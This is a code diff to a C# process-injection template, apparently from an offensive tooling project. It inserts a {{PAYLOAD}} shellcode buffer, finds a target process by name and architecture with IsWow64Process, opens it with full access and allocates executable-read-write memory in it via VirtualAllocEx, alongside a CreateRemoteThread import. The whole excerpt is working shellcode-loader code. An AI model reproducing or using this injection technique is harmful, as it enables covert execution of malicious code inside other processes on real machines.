@@ -27,13 +27,28 @@ namespace Craft
 
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-        
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);
+    
         public static void Main()
         {
             {{PAYLOAD}}
 
-            int pid = Process.GetProcessesByName("{{PROCESS}}")[0].Id;
-
+            int pid = -1;
+            foreach (var proc in Process.GetProcessesByName("{{PROCESS}}"))
+            {
+                bool isWow64;
+                if (IsWow64Process(proc.Handle, out isWow64) && isWow64 == {{ARCH}})
+                {
+                    pid = proc.Id;
+                    break;
+                }
+            }
+            if (pid == -1) {
+                return;
+            }
+            
             IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
             IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, COMMIT_RESERVE, EXECUTEREADWRITE);
 
